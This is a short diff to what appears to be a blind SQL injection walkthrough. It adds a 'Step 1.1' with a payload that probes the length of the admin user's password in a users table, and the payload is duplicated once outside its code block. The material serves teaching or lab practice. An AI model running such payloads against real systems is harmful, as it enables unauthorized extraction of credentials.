@@ -44,6 +44,16 @@ Breakdown:
 - `='a'` — compares the subquery's literal output against the same literal; this isn't really
   testing data, it's testing whether the subquery *executes without error*, confirming the
   table exists and is non-empty.
+' AND (SELECT CHAR_LENGTH(password) FROM users WHERE username='admin')=8-- -
+
+
+**Step 1.1 — confirm table/columns length**
+
+```sql
+' AND (SELECT CHAR_LENGTH(password) FROM users WHERE username='admin')=8-- -
+
+```
+
 
 **Step 2 — extract data character by character using `SUBSTRING`:**
 
